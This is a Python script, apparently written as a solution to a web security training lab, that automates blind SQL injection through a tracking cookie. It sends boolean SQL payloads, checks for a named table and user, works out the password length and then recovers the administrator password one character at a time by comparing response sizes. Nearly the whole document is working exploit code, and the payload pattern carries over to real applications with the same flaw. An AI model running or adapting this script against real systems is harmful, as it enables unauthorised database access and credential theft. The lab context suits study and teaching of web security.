#Lab task
#   This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, 
# and performs a SQL query containing the value of the submitted cookie.
#   The results of the SQL query are not returned, and no error messages are displayed. 
# But the application includes a "Welcome back" message in the page if the query returns any rows.
#   The database contains a different table called users, with columns called username and password. 
# You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
#   To solve the lab, log in as the administrator user.

#   I know that this can be done in BurpSuite itself.

import requests
import string

url = 'https://0adb00c7047c9baa80f08b8900e50011.web-security-academy.net'#Input url

response = requests.get(url)
cookie = response.cookies.get('TrackingId')
brtList = list(string.ascii_lowercase + string.digits)
Table = input("Введите имя таблицы: ")
User = input("Введите имя пользователя: ")

Param = []
SucParams = cookie +  "' AND '1'='1"
FlsParams = cookie +  "' AND '1'='2"
response = requests.get(url)
if response.status_code == 200:
    cookies = {'TrackingId': SucParams}
    response = requests.get(url, cookies=cookies)
    Param.append(len(response.content))
    print('Успешное соединение - ',Param[0])
    cookies = {'TrackingId': FlsParams}
    response = requests.get(url, cookies=cookies)
    Param.append(len(response.content))
    FirstStat = len(response.content)
    print("Неудачное соединение - ",Param[1])
else :
    print('failure')
    
CheckParam = cookie + "' AND (SELECT 'a' FROM " + Table + " LIMIT 1)='a"
cookies = {'TrackingId': CheckParam}
response = requests.get(url, cookies=cookies)
if len(response.content) != FlsParams:
    print("Таблица '" + Table + "' найдена")
else:
    print("Здесь нет такой таблицы")
CheckUsr = cookie + "' AND (SELECT 'a' FROM " + Table + " WHERE username='" + User + "')='a"
cookies = {'TrackingId': CheckUsr}
response = requests.get(url, cookies=cookies)
if len(response.content) != FlsParams:
    print("Пользователь '" + User + "' найден")
else:
    print("В таблице нет такого пользователя")

for stat in range(0,100):
    LenParam = cookie + "' AND (SELECT 'a' FROM " + Table + " WHERE username='" + User + "' AND LENGTH(password)=" + str(stat) + ")='a"
    cookies = {'TrackingId': LenParam}
    response = requests.get(url, cookies=cookies)
    print(stat)
    if len(response.content) != FirstStat:
        Stat = str(stat) + " - " +str(len(response.content))
        break
    else :
        continue
print("\nДлина пароля: " ,Stat)
Password = ""
for numbs in range(1,stat + 1):
    print(numbs, " символ:")
    for tries in brtList:
        PassParam = cookie + "' AND (SELECT SUBSTRING(password," + str(numbs) + ",1) FROM " + Table + " WHERE username='" + User + "')='" + tries
        cookies = {'TrackingId': PassParam}
        response = requests.get(url, cookies=cookies)
        print(str(Password)+str(tries))
        if len(response.content) != FirstStat:
            Password += tries
            break
        else :
            continue
print("\nДля ", User ,"\nПароль: ",Password)
